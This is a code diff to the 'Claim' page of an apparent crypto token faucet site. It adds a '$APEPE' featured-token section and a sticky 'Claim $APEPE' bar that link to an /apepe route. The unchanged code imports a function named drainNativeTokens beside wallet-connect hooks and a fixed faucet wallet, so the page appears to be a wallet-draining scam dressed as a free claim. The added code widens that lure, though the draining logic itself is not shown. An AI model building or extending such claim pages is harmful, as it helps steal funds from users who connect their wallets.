@@ -18,6 +18,8 @@ import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
+import { Link } from 'react-router-dom';
+import apepeImage from '@/assets/apepe.jpg';
 
 const CLAIM_AMOUNT = 0.1;
 const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -573,6 +575,33 @@ const Claim = () => {
               <ConnectWalletButton />
         </div>
       </section>
+
+      {/* $APEPE Featured Token */}
+      <section className="py-12 sm:py-16 px-4">
+        <div className="container mx-auto max-w-2xl text-center">
+          <p className="text-sm uppercase tracking-widest text-muted-foreground mb-4">Featured Token</p>
+          <Link to="/apepe" className="inline-block group">
+            <div className="p-1 rounded-2xl bg-gradient-to-r from-primary to-secondary shadow-[0_0_40px_hsl(var(--primary)/0.4)] transition-transform group-hover:scale-105">
+              <img
+                src={apepeImage}
+                alt="$APEPE"
+                className="w-48 h-48 sm:w-64 sm:h-64 rounded-2xl object-cover"
+              />
+            </div>
+            <p className="mt-4 text-2xl font-bold text-gradient">$APEPE</p>
+            <p className="text-sm text-muted-foreground">Tap to claim →</p>
+          </Link>
+        </div>
+      </section>
+
+      {/* Bottom Bar with $APEPE */}
+      <div className="sticky bottom-0 left-0 right-0 z-40 bg-background/80 backdrop-blur-md border-t border-white/10 py-3 px-4">
+        <Link to="/apepe" className="container mx-auto flex items-center justify-center gap-3 hover:opacity-80 transition-opacity">
+          <img src={apepeImage} alt="$APEPE" className="w-10 h-10 rounded-full object-cover border border-primary/40" />
+          <span className="font-bold text-foreground">Claim $APEPE</span>
+          <span className="text-primary">→</span>
+        </Link>
+      </div>
     </div>
   );
 };
